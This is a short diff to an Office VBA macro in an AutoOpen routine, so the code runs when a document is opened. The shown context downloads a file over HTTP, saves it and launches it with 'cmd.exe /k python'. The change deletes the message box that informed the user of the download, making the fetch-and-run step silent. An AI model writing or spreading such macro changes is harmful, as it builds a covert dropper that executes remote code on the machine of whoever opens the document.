@@ -20,9 +20,6 @@ Sub AutoOpen()
         stream.Write http.responseBody
         stream.SaveToFile savePath, 2 ' 2 = overwrite
         stream.Close
-
-        MsgBox "Successfully downloaded the script at " & savePath
-
         shell "cmd.exe /k python """ & savePath & """", vbNormalFocus
     Else
         MsgBox "Failed to run the script. Status: " & http.Status
